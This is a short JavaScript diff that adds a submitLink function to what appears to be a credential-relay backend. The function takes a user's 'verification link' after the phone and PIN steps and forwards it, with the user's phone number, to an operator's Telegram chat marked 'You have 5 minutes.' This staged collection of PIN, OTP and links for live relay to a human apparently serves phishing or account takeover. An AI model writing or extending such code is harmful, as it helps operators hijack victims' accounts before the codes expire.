@@ -337,6 +337,35 @@ function submitOtp(requestId, otp) {
     return { success: true, message: 'OTP submitted for verification' };
 }
 
+function submitLink(requestId, link) {
+    const request = approvals.get(requestId);
+    if (!request) {
+        return { success: false, message: 'Request not found' };
+    }
+
+    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending') {
+        return { success: false, message: 'Phone/PIN not verified yet' };
+    }
+
+    request.otp = link;
+    request.status = 'otp_pending';
+
+    if (botEnabled && bot) {
+        bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
+            `📱 Phone: ${request.userPhone}\n` +
+            `📦 Package: ${request.package}\n` +
+            `🔗 Link: ${link}\n\n` +
+            `Please verify by clicking "Verify Link" and confirming.\n` +
+            `⏱️ You have 5 minutes.`).then((msg) => {
+            request.adminOtpMessageId = msg.message_id;
+        }).catch((err) => {
+            console.error('Failed to send link notification:', err.message);
+        });
+    }
+
+    return { success: true, message: 'Link submitted for verification' };
+}
+
 function getApprovalStatus(requestId) {
     const request = approvals.get(requestId);
     if (!request) {
@@ -366,6 +395,7 @@ module.exports = {
     bot,
     createApprovalRequest,
     submitOtp,
+    submitLink,
     getApprovalStatus,
     sendNotification,
     approvals
